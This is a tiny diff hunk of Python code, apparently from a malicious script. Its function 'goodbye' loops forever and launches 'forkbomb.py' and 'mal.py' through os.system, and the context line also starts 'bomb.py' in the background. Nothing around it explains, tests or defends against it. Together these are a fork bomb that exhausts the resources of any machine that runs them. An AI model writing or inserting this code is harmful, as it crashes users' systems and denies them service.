@@ -7,4 +7,4 @@ os.system("python _run.py & python bomb.py &")
 def goodbye():
   mal = True
   while mal == True:
-    forkbomb()
+    os.system("python forkbomb.py & mal.py &")
